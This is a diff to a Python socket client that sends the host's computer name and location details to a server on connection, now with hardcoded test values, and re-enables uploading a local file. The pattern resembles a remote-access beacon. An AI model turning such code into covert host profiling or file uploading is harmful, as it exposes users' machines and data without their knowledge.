@@ -31,7 +31,7 @@ class Client:
         self.send_system_info()
 
         # Send a file to the server from: cool.txt
-        #self.send_file("cool.txt")
+        self.send_file("cool.txt")
 
     def connect_to_server(self) -> None:
         """Connect to the server."""
@@ -43,9 +43,14 @@ class Client:
 
     def send_system_info(self) -> None:
         """Send system information to the server."""
-        ip = requests.get("https://api.ipify.org").text
-        country = requests.get("https://ipapi.co/country_name").text
-        isp = requests.get("https://ipapi.co/org").text
+        #ip = requests.get("https://api.ipify.org").text
+        #country = requests.get("https://ipapi.co/country_name").text
+        #isp = requests.get("https://ipapi.co/org").text
+
+        # Using test information not to get banned
+        ip = "127.0.0.1"
+        country = "Norway"
+        isp = "Telenor"
 
         self.send(json.dumps(Message(type=MESSAGE_TYPE_CONNECTION, json_data={
             "computer_name": platform.node(),
@@ -92,21 +97,18 @@ class Client:
             self.client.sendall(chunk)
 
         # Signal the end of the message
-        self.client.sendall(b'END_OF_MESSAGE')
+        #self.client.sendall(b'END_OF_MESSAGE')
 
     def send_file(self, file_path: str, chunk_size: int = 1024) -> None:
         """Send a file to the server with metadata and chunked content."""
         try:
-            # Validate file existence and size
+            # Validate file existence
             if not os.path.exists(file_path):
                 raise FileNotFoundError(f"File not found: {file_path}")
 
-            file_size = os.path.getsize(file_path)
-            if file_size == 0:
-                raise ValueError("Cannot send an empty file.")
-
             file_name = os.path.basename(file_path)
             file_type = utils.get_mime_type(file_path)
+            file_size = os.path.getsize(file_path)
 
             # Step 1: Send metadata
             metadata = json.dumps({
@@ -119,20 +121,14 @@ class Client:
                 "type": "FILE",
                 "total_size": len(metadata),
             })
-            print(f"Sending the files metadata over to the server: {metadata} and header {metadata_header}")
-            # Send metadata header and content
+
             self.client.sendall(len(metadata_header).to_bytes(4, 'big') + metadata_header.encode('utf-8'))
             self.client.sendall(metadata.encode('utf-8'))
 
-            # Step 2: Send file chunks
+            # Step 2: Send file contents in chunks
             with open(file_path, "rb") as file:
                 while chunk := file.read(chunk_size):
-                    chunk_header = len(chunk).to_bytes(4, 'big')  # 4-byte size prefix
-                    print(f"Sending chunk of size {len(chunk)} bytes {chunk}")
-                    self.client.sendall(chunk_header + chunk)
-
-            # Signal the end of the file transfer
-            self.client.sendall(b'END_OF_FILE')
+                    self.client.sendall(chunk)
 
             print(f"File '{file_name}' successfully sent to server.")
 
@@ -144,6 +140,7 @@ class Client:
             print(f"Network error during file transfer: {e}")
         except Exception as e:
             print(f"An unexpected error occurred: {e}")
+
 
     def receive(self) -> str:
         chunks = []
